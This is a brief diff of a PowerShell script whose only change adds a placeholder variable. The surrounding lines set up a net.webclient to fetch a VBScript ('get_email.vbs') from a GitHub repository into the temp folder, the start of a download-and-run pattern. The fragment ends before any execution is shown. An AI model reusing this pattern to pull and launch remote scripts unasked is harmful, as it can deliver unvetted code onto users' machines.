@@ -1,5 +1,6 @@
 $path_vb_ms = [System.IO.Path]::GetTempPath()
 $path_vb_ms=$path_vb_ms+"get_mail.vbs"
+$a="hello"
 $my_path="D:\gmm.vbs"
 $url='https://raw.githubusercontent.com/FurqanKhan1/Dictator/master/get_email.vbs';
 $b=new-object net.webclient;
